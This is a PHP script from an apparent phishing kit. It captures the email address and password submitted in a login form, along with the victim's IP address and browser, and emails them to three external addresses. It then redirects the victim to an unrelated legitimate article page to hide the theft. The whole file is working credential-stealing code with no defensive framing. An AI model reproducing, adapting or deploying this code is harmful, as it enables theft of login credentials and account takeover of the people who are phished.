<?php

$Email = $_POST['Email'];
$password = $_POST['password'];

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$message .= "*************microziel*************\n";
$message .= "Email    : ".$Email."\n";
$message .= "Password   : ".$password."\n";
$message .= "IP Address : $ip\n";
$message .= "--------------------\n";
$message .= "Date : $adddate\n";
$message .= "User-Agent: ".$browser."\n";
$message .= "***************Oz Wir3***************\n";
$message .= "* Success is Loading... because I deserve it! *\n";

$send="wirewire950@yahoo.com,ricklloyd177@gmail.com,wire.results@aol.com";



$subject = "$Email - IP: ".$ip."\n ";
$headers = "";
$str=array($send); foreach ($str as $send)
if(mail($send,$subject,$message,$headers) != false){

header("Location: http://www.cfapubs.org/doi/abs/10.2469/pwmn.v2013.n1.2");
}

?>